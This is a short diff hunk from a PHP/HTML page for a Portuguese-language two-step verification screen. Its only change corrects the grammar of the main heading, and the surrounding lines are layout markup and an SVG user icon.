@@ -111,7 +111,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
         <div class="content-wrapper">
             <div class="left-column">
                 <span class="session-start-label">VERIFICAÇÃO EM 2 ETAPAS</span>
-                <h1 class="main-title">Escolha um método de verificação para confirmar que conta pertence a você</h1>
+                <h1 class="main-title">Escolha um método de verificação para confirmar que a conta pertence a você</h1>
                 <div class="user-identifier-box">
                     <div class="icon-wrapper">
                         <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z"></path></svg>
